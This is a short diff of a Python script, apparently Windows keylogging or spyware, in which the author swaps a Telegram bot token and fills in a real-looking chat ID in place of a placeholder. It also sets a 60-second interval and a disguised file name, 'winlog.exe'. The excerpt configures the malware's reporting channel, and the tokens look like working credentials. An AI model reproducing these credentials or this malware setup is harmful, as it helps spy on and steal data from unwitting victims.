@@ -7,8 +7,8 @@ import sys
 import winreg
 import ctypes
 
-bot_token = '7760127959:AAHlNqVl3gy2BnH-Ave5H1cup2lyeVbgUDA'
-chat_id = 'TERA_CHAT_ID'
+bot_token = '8780761096:AAHa0T0PcnN4dTDZjfn3nAZedlE0eq4uiUE'
+chat_id = '1334871057'
 interval = 60
 filename = "winlog.exe"
 log = ""
